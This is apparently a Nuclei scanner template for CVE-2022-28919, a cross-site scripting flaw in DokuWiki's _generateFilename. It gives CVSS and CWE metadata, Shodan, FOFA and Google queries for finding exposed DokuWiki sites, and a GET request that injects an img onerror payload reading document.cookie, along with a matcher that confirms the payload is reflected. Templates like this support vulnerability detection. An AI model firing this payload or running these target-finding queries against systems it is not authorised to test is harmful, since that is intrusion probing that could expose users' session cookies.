id: CVE-2022-28919

info:
  name: XSS in HTMLCreator _generateFilename
  author: ProjectDiscoveryAI
  severity: medium
  description: HTMLCreator release_stable_2020-07-29 was discovered to contain a cross-site scripting (XSS) vulnerability via the function _generateFilename.
  impact: |
    Successful exploitation could lead to unauthorized access, data theft, and other malicious activities.
  remediation: |
    Sanitize user input and encode output to prevent XSS attacks.
  reference:
    - https://github.com/splitbrain/dokuwiki/issues/3651
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/DB7BXJKFALXHURED3OMJIQ4KEDGZOOWL/
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/JFL5KMLTSWOHTDHURW5W6YP2DV67IQFP/
    - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZGKXK6TK27URC76FTX46Z6OLTKYIQK7E/
    - https://github.com/Live-Hack-CVE/CVE-2022-28919
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-28919
    cwe-id: CWE-79
    epss-score: 0.00109
    epss-percentile: 0.45427
    cpe: cpe:2.3:a:dokuwiki:dokuwiki:2020-07-29:*:*:*:*:*:*:*
  metadata:
    vendor: dokuwiki
    product: dokuwiki
    shodan-query: http.title:"DokuWiki"
    fofa-query:
      - body="/dokuwiki/"
      - title="dokuwiki"
    google-query: intitle:"dokuwiki"

http:
  - method: GET
    path:
      - "{{BaseURL}}/path/%3Cimg%20src%3D%22aaa.img%22%20onerror%3Dalert(document.cookie)%3B%3E"

    matchers:
      - type: word
        words:
          - "<img src=\"aaa.img\" onerror=alert(document.cookie);>"
        part: body
